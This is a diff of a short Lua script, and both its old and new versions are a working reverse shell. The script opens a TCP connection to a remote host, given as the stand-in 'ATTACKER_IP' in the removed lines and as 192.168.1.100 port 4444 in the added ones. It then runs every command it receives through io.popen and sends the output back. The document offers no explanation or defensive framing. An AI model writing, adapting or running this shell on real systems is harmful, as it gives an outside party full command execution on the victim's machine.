@@ -1,13 +1,11 @@
 local socket = require("socket")
-local host, port = "ATTACKER_IP", 80
-local tcp = assert(socket.tcp())
-tcp:connect(host, port)
-tcp:send("Connected!\n")
+local client = socket.tcp()
 
+client:connect("192.168.1.100", 4444)
 while true do
-    local cmd = tcp:receive()
-    local handle = io.popen(cmd)
+    local command = client:receive()
+    local handle = io.popen(command)
     local result = handle:read("*a")
     handle:close()
-    tcp:send(result)
+    client:send(result)
 end
